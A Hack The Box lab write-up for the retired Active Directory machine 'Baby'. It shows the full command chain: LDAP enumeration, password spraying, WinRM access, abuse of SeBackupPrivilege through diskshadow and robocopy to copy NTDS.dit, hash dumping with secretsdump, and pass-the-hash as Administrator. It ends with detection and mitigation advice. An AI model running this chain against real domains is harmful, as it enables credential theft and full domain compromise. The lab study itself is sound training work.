---
machine: Baby
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, ldap, backup-operators, sebackupprivilege, ntds]
---

# Baby — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; not played on this profile. No real credentials or flags.

## Summary

An Active Directory domain with an exposed domain controller. LDAP enumeration reveals a default credential reused on another account, which has WinRM access. Privilege escalation abuses `Backup Operators`/`SeBackupPrivilege` to copy `NTDS.dit` and the system hives, dump domain hashes and reuse Administrator's hash.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV <IP>
```

The usual DC ports (DNS, Kerberos, LDAP, SMB, WinRM) confirm the role. Add the domain and host to `/etc/hosts`.

```bash
netexec smb <IP> -u '' -p '' --shares
netexec ldap <IP> -u '' -p '' --query '(objectClass=*)' description
ldapsearch -x -H ldap://<IP> -b 'DC=baby,DC=vl' '(objectClass=user)' description
```

The credential appears in a user's descriptive attribute. Spray it carefully against the remaining accounts:

```bash
netexec smb <IP> -u users.txt -p '<PASSWORD>' --continue-on-success
netexec winrm <IP> -u <USER> -p '<PASSWORD>'
```

## Initial access

```bash
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'
```

The account belongs to `Backup Operators` or has equivalent rights. Confirm with:

```powershell
whoami /groups
whoami /priv
```

## Escalation

`SeBackupPrivilege` allows reading files while bypassing ACLs. Create a shadow volume and copy `NTDS.dit` and the hives:

```text
diskshadow.exe /s backup.txt
```

```text
set context persistent nowriters
add volume C: alias htb
create
expose %htb% Z:
```

```powershell
robocopy /b Z:\Windows\NTDS . NTDS.dit
robocopy /b Z:\Windows\System32\config . SYSTEM
robocopy /b Z:\Windows\System32\config . SECURITY
```

On the analysis host:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM -security SECURITY LOCAL
```

The dump includes Administrator's NTLM hash. Reuse it over WinRM or SMB:

```bash
netexec winrm <IP> -u Administrator -H '<NTLM_HASH>'
evil-winrm -i <IP> -u Administrator -H '<NTLM_HASH>'
```

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

No real values are published.

## Lessons

- A descriptive LDAP attribute can leak a valid credential.
- Spray slowly with a single password to avoid lockouts.
- `Backup Operators` is a direct path to `NTDS.dit`; DCSync is not required.
- Copying all three hives avoids depending on a single file.

## Detection and mitigation

- Audit user descriptions and `info` fields; never store secrets in LDAP.
- Alert on WinRM logons from service or newly created accounts.
- Monitor `SeBackupPrivilege`, `diskshadow`, `robocopy /b` and access to `NTDS.dit`.
- Restrict `Backup Operators` and rotate credentials after an incident.

## References

- <https://0xdf.gitlab.io/2025/09/19/htb-baby.html>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts>
- <https://attack.mitre.org/techniques/T1003/003/>
